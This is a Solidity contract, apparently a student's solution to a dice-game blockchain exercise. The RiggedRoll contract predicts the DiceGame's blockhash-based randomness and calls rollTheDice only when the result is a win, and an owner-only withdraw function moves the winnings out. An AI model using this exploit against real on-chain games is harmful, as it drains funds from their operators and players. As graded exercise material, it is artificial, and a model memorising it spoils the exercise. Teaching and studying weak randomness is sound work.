pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    address payable diceGameAddress;

    constructor(address payable _diceGameAddress) {
        diceGameAddress = _diceGameAddress;
        diceGame = DiceGame(diceGameAddress);
        // owner = "0xF25189aDF5A553578d63f9F8863Fc93FAf94A65A";
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw (address payable _to, uint256 _amount) public onlyOwner{
        require (address(this).balance >= _amount, "not enougth fund");
        (bool sucess, ) = _to.call{value: _amount}("");
        require(sucess, "transfert fail");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll () external{
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 futureDiceNonce = diceGame.nonce(); 
        bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGameAddress, futureDiceNonce));
        uint256 roll = uint256(hash) % 16;
        console.log(roll);
        require (roll < 3 , "not good rool");
        diceGame.rollTheDice{value : 0.002 ether}();
        
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {  }
}
